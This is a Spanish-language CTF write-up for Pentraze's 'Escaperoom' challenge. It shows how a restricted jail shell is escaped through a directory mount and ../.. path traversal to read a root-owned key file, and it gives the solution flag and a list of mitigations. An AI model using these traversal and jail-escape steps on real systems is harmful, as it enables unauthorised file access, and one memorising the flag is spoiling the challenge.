---
tipo: laboratorio
tags: [ctf, pentraze, misc, introductory]
Plataforma: "Pentraze CTF"
Categoría: "Misc"
Dificultad: "Introductory"
Estado: "Completado"
Puntos: "25"
Flag: "PENTRAZE{67bf2ae75995170e86334a17563a9664795182073ebbd8ee086cc410aa77d4ea}"
actualizado: 2026-09-24
---
- **Categoría Principal:** [[CTF - Misc|Misc]]
- **Dificultad:** [[CTF - Introductory|Introductory]]
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Estado:** Completado
- **Puntos:** 25

# Writeup - Escaperoom

> [!info] Objetivo
> Escapar de la celda de aislamiento y encontrar la llave maestra.

- **Servicio:** `nc 34.135.253.132 34157`
- **Categoría:** Misc
- **Dificultad:** Introductory

## Resumen rápido de la cadena de ataque

1. La ayuda normal solo permite `help`, `ls`, `cat`, `cd`, `pwd`, `whoami` y `exit`.
2. `help maintenance` revela `mounts`, `attach <n>` y `chroot <path>`.
3. `mounts` muestra que el conducto 5 es el único de tipo `dir`.
4. `attach 5` permite salir de la celda, pero el `flag.txt` visible es un señuelo.
5. Desde el directorio exterior, `ls ../..` revela el filesystem real del contenedor.
6. La llave estaba en `/root/.llave_maestra`.

## Vulnerabilidades explotadas

- **Expuesta de un directorio montado como vía de escape** en la consola restringida.
- **Confused deputy / dependencia de la ruta de trabajo:** el directorio exterior conservaba la posibilidad de navegar a niveles superiores.
- **Filtro de comandos incompleto:** los comodines permitían leer el `flag.txt` de la prisión, aunque fuera un señuelo.
- **Fuga de filesystem contenedor** al no aislar completamente el directorio de trabajo.

## Paso a paso técnico

### 1. Entrar y enumerar comandos

```bash
nc 34.135.253.132 34157
```

La pantalla mostraba `ROOTKITTY · Terminal de Celda v3.1.7` y confirmaba que el usuario estaba confinado. La ayuda básica se obtiene con:

```text
help
help maintenance
```

### 2. Descubrir el conducto utilizable

```text
mounts
```

Salida relevante:

```text
conducto 0   socket
conducto 1   socket
conducto 2   pipe
conducto 3   socket
conducto 4   socket
conducto 5   dir
conducto 8   socket
```

El descriptor 5 era el único `dir`, por lo que se intentó:

```text
attach 5
```

La consola respondió:

```text
te arrastras por el conducto 5...
preso:(fuera)$
```

### 3. Descartar el flag señuelo

Desde `(fuera)` se listó:

```text
ls /
# etc/ var/ flag.txt
cat /flag.txt
# leer: acceso a '/flag.txt' denegado: término restringido
```

El uso de comodines permitió observar el contenido, pero era explícitamente un señuelo:

```text
FLAG{esta_celda_es_un_senuelo___los_presos_de_verdad_trepan_los_muros}
```

La frase `los presos de verdad trepan los muros` indicaba que había que subir más que un directorio.

### 4. Salir de la estructura de la prisión

```text
ls ..
# prision/

ls ../..
# opt/ etc/ media/ lib home/ lib64 bin/ boot/ sbin/ root/
# usr/ dev/ srv/ mnt/ var/ sys/ tmp/ run/ proc/ .dockerenv
```

El salto a `../..` ya estaba fuera de la prisión. La ruta final era:

```text
ls ../../root/
# .profile .bashrc .llave_maestra

cat ../../root/.llave_maestra
```

## Flag

```text
PENTRAZE{67bf2ae75995170e86334a17563a9664795182073ebbd8ee086cc410aa77d4ea}
```

## Lecciones aprendidas y mitigar

- Un modo restringido debe implementarse con una allowlist real de operaciones, no solo con una palabra prohibida.
- Un directorio de trabajo no debe permanecer dentro de una ruta que pueda alcanzar el filesystem del host o del contenedor.
- `chroot` no es suficiente para crear un jail seguro por sí solo; hacen falta namespaces, propagación de montajes, restricciones del filesystem y drop de privilegios.
- Filtrar el acceso a `flag.txt` no sirve si el mismo contenido puede extraerse mediante wildcards, symlinks o rutas alternativas.
- Mantener el secreto fuera del filesystem accesible al proceso y montarlo solo cuando sea necesario.
- Ejecutar el servicio con usuario sin privilegios, con un sistema de archivos de solo lectura donde aplique y límites de recursos.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🗂️ Categoría: [[CTF - Misc]]
- ⬅️ Anterior: [[Writeup - HooKitty|HooKitty]]
- ➡️ Siguiente: [[Writeup - Eco Persistente|Eco Persistente]]

## Relacionadas

- [[Container Escape]] — aislamiento de procesos y filesystem.
- [[Directory Traversal]] — navegación fuera del directorio esperado.
- [[Linux]] — rutas, permisos y concepto de montajes.
